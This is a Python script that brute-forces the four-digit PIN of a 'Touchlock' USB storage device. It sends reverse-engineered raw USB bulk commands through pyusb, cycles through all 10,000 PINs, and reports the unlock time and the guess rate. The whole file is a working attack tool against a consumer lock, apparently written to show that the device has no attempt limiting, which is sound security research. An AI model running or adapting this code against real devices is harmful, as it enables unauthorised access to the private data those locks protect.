import time
import sys
import usb.core
import usb.util
#import usb.backend.libusb1 as libusb1
import usb.backend.libusb0 as libusb0
#import usb.backend.openusb as openusb
import os
os.environ['PYUSB_DEBUG'] = 'debug'

VENDOR_ID = 0x04d6
DEVICE_ID = 0xe301
MANUFACTURER_NAME = "Touchlock"
PRODUCT_NAME = "Touchlock"
be = libusb0.get_backend()

dev = usb.core.find(backend=be, idVendor=VENDOR_ID, idProduct=DEVICE_ID)
if "400 mA" not in str(dev) : 
    print("failed to find dev")
    sys.exit()

cmd4 = [x for x in bytearray.fromhex("5553424390b057871000000000000aef014200100000000000000000000000")]
cmd6 = [x for x in bytearray.fromhex("5553424320e691750400000080000aef024200100000000000000000000000")] 
zeroes = [0]*12
timeout = 100

def test_pin(pin):
    dev.write(0x1, cmd4, timeout)  #this sets up the bulk transfer? I get a pipe error without this first
    dev.write(0x1, [0x30+x for x in pin]+zeroes, timeout) #send the PIN
    data = dev.read(0x82,31) #read junk back
    dev.write(0x1, cmd6, timeout) #ask if it worked?
    data = dev.read(0x82,31) #read reply
    locked = data[1]
    data = dev.read(0x82,31) #read junk
    return locked

print("Brute force test\n\nTesting PIN:")
count = 0
start = time.time()
for a in range(9, -1, -1):
    for b in range(9, -1, -1):
        for c in range(9, -1, -1):
            for d in range(9, -1, -1):
                pin = [a,b,c,d]
                count += 1
                print("\r{}{}{}{}".format(a,b,c,d), end="") #4.25 seconds @10000, remove this line for 3.7 seconds.
                locked = test_pin(pin)
                if locked == 0: 
                    end = time.time()
                    elapsed = end - start
                    print("\nUnlocked in %.2f seconds after trying %d PINs (%d guesses per second)\n\n"%(elapsed, count, count/elapsed))
